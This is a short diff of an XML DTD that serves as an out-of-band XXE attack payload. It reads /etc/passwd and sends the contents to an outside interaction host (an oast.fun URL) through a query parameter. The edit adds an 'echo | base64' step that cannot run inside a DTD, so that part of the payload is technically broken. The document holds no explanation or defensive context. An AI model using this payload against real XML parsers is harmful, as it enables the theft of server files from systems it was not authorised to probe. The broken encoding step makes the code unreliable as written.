@@ -1,3 +1,4 @@
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://jbogwmzyhnnqmnbdpwqsu2sdb72du2hjq.oast.fun/?leak=%file;'>">
-%all;
+<!ENTITY % b64 "echo -n '%file;' | base64">
+<!ENTITY % send "<!ENTITY exfil SYSTEM 'http://jbogwmzyhnnqmnbdpwqsu2sdb72du2hjq.oast.fun/?leak=%b64;'>">
+%send;
